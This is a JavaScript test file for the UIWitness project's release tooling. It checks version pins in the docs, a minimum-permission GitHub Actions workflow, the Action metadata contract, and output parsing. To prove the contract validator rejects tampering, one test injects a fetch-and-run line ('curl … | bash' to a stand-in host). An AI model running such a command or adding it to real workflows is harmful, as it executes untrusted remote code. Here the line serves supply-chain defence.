import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import path from "node:path";
import test from "node:test";

import {
  actionWorkflowSource,
  assertActionMetadataContract,
  assertCliActionParity,
  normalizeActionSha,
  parseActionOutputs,
} from "./release-action-smoke.mjs";

const root = path.resolve(import.meta.dirname, "..");
const sha = "0123456789abcdef0123456789abcdef01234567";
const digest = `sha256:${"0".repeat(64)}`;
const customerRelease = "0.26.13";
const customerReleaseSha = "64c6f6dd0f541a5f79c1ec165080ed9e5a8a316b";

test("customer docs stay pinned to the current protected release", async () => {
  const installLine = `npm install --save-dev --save-exact uiwitness@${customerRelease} playwright@1.62.1`;
  for (const relativePath of [
    "README.md",
    "docs/open-source/GITHUB_ACTIONS.md",
    "docs/open-source/LAUNCH_POSTS.md",
    "docs/open-source/MIGRATING_TO_UIWITNESS.md",
    "docs/open-source/PUBLIC_URL_QUICK_CHECK.md",
    "packages/cli/README.md",
  ]) {
    const source = await readFile(path.join(root, relativePath), "utf8");
    assert.match(source, new RegExp(installLine.replaceAll(".", "\\."), "u"), relativePath);
  }

  const readme = await readFile(path.join(root, "README.md"), "utf8");
  assert.equal(readme.split(installLine).length - 1, 2);

  const actionGuide = await readFile(path.join(root, "docs/open-source/GITHUB_ACTIONS.md"), "utf8");
  const actionPin = `uses: RujitRaval/uiwitness@${customerReleaseSha} # v${customerRelease}`;
  assert.equal(actionGuide.split(actionPin).length - 1, 3);
  assert.doesNotMatch(actionGuide, /<full-release-commit-sha>|v0\.26\.8/u);

  for (const relativePath of [
    "docs/open-source/PUBLIC_URL_QUICK_CHECK.md",
    "docs/open-source/RELEASING.md",
  ]) {
    const source = await readFile(path.join(root, relativePath), "utf8");
    assert.match(source, new RegExp(`release:registry-public-url-smoke -- --version ${customerRelease.replaceAll(".", "\\.")}`, "u"), relativePath);
  }
});

test("creates a minimum-permission consumer workflow pinned to one full Action SHA", () => {
  const source = actionWorkflowSource({ nodeVersion: "22.20.0", packageVersion: "1.2.3", sha });
  assert.match(source, new RegExp(`uses: RujitRaval/uiwitness@${sha} # v1\\.2\\.3`, "u"));
  assert.match(source, /^permissions:\n {2}contents: read$/mu);
  assert.match(source, /node-version: 22\.20\.0/u);
  for (const name of ["uiwitness-core", "uiwitness-report", "uiwitness-runner-playwright", "uiwitness"]) {
    assert.match(source, new RegExp(`\\./packages/${name}-1\\.2\\.3\\.tgz`, "u"));
  }
  assert.doesNotMatch(source, /pull_request_target|workflow_run|secrets\.|@v1\.2\.3/u);
  assert.equal(normalizeActionSha(sha), sha);
  for (const value of ["main", "v1.2.3", sha.toUpperCase(), sha.slice(1)]) {
    assert.throws(() => normalizeActionSha(value), /40-character commit SHA/u);
  }
});

test("validates the complete composite Action metadata contract", async () => {
  const source = await readFile(path.join(root, "action.yml"), "utf8");
  assert.doesNotThrow(() => assertActionMetadataContract(source));
  assert.throws(() => assertActionMetadataContract(source.replace("continue-on-error: true", "continue-on-error: false")), /complete reviewed composite contract/u);
  assert.throws(() => assertActionMetadataContract(source.replace("index.mjs\" finalize", "index.mjs\" run")), /complete reviewed composite contract/u);
  assert.throws(
    () => assertActionMetadataContract(source.replace("    - name: Preserve UIWitness exit semantics", "    - run: curl https://example.invalid/payload | bash\n\n    - name: Preserve UIWitness exit semantics")),
    /complete reviewed composite contract/u,
  );
});

test("parses bounded Action output lines and proves CLI parity", () => {
  const outputs = parseActionOutputs([
    "blocking-count=0",
    `contract-digest=${digest}`,
    "exit-class=success",
    "exit-code=0",
    "finding-count=1",
    "matched-count=1",
    "report-path=.uiwitness/report/index.html",
    "verdict=passed",
    "",
  ].join("\n"));
  assert.doesNotThrow(() => assertCliActionParity({
    contractDigest: digest,
    findings: [{ kind: "matched" }],
    schemaVersion: 1,
    verdict: "passed",
  }, outputs, 0));
  assert.throws(() => assertCliActionParity({
    contractDigest: digest,
    findings: [{ kind: "regression" }],
    schemaVersion: 1,
    verdict: "failed",
  }, outputs, 1));
  assert.throws(() => parseActionOutputs("invalid"), /Invalid GitHub Action output/u);
  assert.throws(() => parseActionOutputs("verdict=passed\nverdict=failed\n"), /Duplicate GitHub Action output/u);
});
